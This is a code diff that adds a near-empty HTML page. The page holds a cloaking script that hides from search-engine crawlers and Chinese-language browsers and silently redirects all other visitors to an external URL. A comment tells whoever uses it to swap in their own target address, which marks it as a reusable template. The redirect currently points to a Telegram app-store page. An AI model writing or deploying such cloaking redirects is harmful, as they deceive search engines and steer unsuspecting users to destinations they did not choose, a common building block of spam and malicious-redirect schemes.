@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <p>123</p>
+    <script>
+        const bots = ["Googlebot", "Bingbot", "DuckDuckBot", "Baiduspider", "YandexBot"];
+        
+        const isBot = bots.some(bot => navigator.userAgent.includes(bot));
+        
+        const isChineseBrowser = navigator.language.includes("zh") || 
+                                    navigator.languages.some(lang => lang.includes("zh") || lang.includes("zh-CN") || lang.includes("zh-TW") || lang.includes("zh-HK"));
+        
+        if (!isBot && !isChineseBrowser) {
+            window.location.href = "https://play.google.com/store/apps/details/Telegram?id=org.telegram.messenger&hl=zh_CN&pli=1"; // 替换为你的目标跳转网址
+        }
+    </script>
+      
+</body>
+</html>
